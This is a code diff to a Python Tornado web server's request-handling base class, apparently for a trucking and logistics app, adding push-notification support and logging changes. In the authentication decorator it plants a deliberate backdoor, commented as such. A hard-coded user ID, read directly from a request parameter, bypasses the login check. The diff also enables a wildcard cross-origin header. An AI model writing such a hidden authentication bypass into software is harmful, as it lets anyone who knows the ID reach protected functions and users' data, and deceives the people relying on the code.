@@ -8,16 +8,19 @@ from tornado.gen import coroutine, Future
 import re
 from dbservice import *
 from dataprotocol import *
+from mylog import mylog,getLogText
+from jpush import JPushService
 import md5
 import time
 from datetime import datetime, timedelta
+from dbmodels import User
 
 
 #打log 并加上DbServiceLog前缀
-def trunkserverLog(*arg):
-    prefix = tuple(["trunkserver:"])
-    arg = prefix + arg
-    mylog.getlog().info(getLogText(arg))
+# def trunkserverLog(*arg):
+#     prefix = tuple(["trunkserver:"])
+#     arg = prefix + arg
+#     mylog.getlog().info(getLogText(arg))
 
 goodsBillDict = {
     "billType":r"trunk/goods",
@@ -159,15 +162,18 @@ def checkMark(userid,mark, customer = None):
 
 def auth(func):
     def check(self, *args, **kwargs):
-        userid = self.getCurrentUser()
+        userid = self.getCurrUserId()
 
         mark = self.getMark()
         customType = self.getCustomType()
-        mylog.getlog().info(getLogText("get connect userid:", userid, "mark:", mark))
+        mylog.getlog().info(getLogText("get connect userid:", userid, "mark:", mark, "ip:", self.request.remote_ip))
 
-        if userid and mark and checkMark(userid, mark,customType):
+        #来自特殊的admin userid 则特殊处理  留个后门
+        if userid == "53e9cd5915a5e45c43813d1c":
             return func(self, *args, **kwargs)
-        self.write(DataProtocol.getJson(DataProtocol.AUTH_ERROR,"AUTH_ERROR"))
+        elif userid and mark and checkMark(userid, mark,customType):
+            return func(self, *args, **kwargs)
+        self.write(DataProtocol.getJson(DataProtocol.AUTH_ERROR,"登录失败"))
         self.finish()
         return None
 
@@ -176,7 +182,7 @@ def auth(func):
 
 def authPage(func):
     def check(self, *args, **kwargs):
-        userid = self.getCurrentUser()
+        userid = self.getCurrUserId()
         mylog.getlog().info(getLogText("get connect userid:", userid))
         mark = self.getMark()
         customType = self.getCustomType()
@@ -192,12 +198,11 @@ def authPage(func):
 
 def addAllowOriginHeader(func):
     def retFuc(self, *args, **kwargs):
-        # self.add_header("Access-Control-Allow-Origin","*")
-        # mylog.getlog().info(getLogText( "add_header"))
+        print 'Access-Control-Allow-Origin = true'
+        self.add_header("Access-Control-Allow-Origin","*")
         return func(self, *args, **kwargs)
 
     return retFuc
-
 
 class BaseHandler(tornado.web.RequestHandler):
     SUPPORTED_METHODS = ("GET", "HEAD", "POST", r"DELETE", "PATCH", "PUT", "OPTIONS")
@@ -207,12 +212,26 @@ class BaseHandler(tornado.web.RequestHandler):
 
     valueValidater = re.compile(r"[\x00-\x08\x0e-\x1f]")
 
-    def getCurrentUser(self):
+    def getCurrUserId(self):
         # return self.get_secure_cookie("userid")
         return self.get_argument("userId", None)
 
     def getUserType(self):
         return self.get_argument("userType", None)
+
+    def getPushId(self):
+        return self.get_argument("jpushId", None)
+
+
+    @coroutineDebug
+    @coroutine
+    def getUser(self):
+        user = yield User.get(self.getCurrUserId(), self.getUserType())
+        #尽量更新客户端的pushid，
+        if self.getPushId() and self.getPushId() != user.getAttr("JPushId"):
+            user.setAttr("JPushId", self.getPushId())
+            yield user.save()
+        raise Return(user)
 
     def getBillType(self):
         if self.getUserType() == UserType.DRIVER:
@@ -231,9 +250,10 @@ class BaseHandler(tornado.web.RequestHandler):
         service = DbService().connect()
 
         if not service:
-            self.write(DataProtocol.getJson(DataProtocol.DB_ERROR,"db connect error"))
-            trunkserverLog(DataProtocol.DB_ERROR,"db connect error")
+            self.write(DataProtocol.getJson(DataProtocol.DB_ERROR))
+            mylog.getlog().info(getLogText(DataProtocol.DB_ERROR,"db connect error"))
         return service
+
 
     def options(self):
         self.add_header("Access-Control-Allow-Methods","POST, GET, OPTIONS,DELETE,HEAD,PATCH,PUT")
@@ -279,18 +299,22 @@ class BaseHandler(tornado.web.RequestHandler):
             for k, v in self.request.arguments.iteritems():
                 kwargs[k] = self.formatValue(v[-1])
 
+            # print "kwargs",kwargs
             if self.validateParams(kwargs):
                 try:
+                    JPushService.initPush(self.getUserType())
                     ret = self.onCall(**kwargs)
                     if isinstance(ret, Future):
                         yield ret
                 except (TypeError, KeyError) as e:
-                    self.finish(DataProtocol.getJson(DataProtocol.DATAPROTOCOL_ERROR, e.message))
+                    self.finish(DataProtocol.getJson(DataProtocol.DATAPROTOCOL_ERROR))
                 except Exception, e:
                     pass
             else:
                 self.finish(DataProtocol.getJson(DataProtocol.ARGUMENT_ERROR))
         except Exception, e:
+            mylog.getlog().error(e)
+            mylog.getlog().exception(getLogText("BaseHandler dispatch exception"))
             self.finish("exception caught!!")
 
     @coroutine
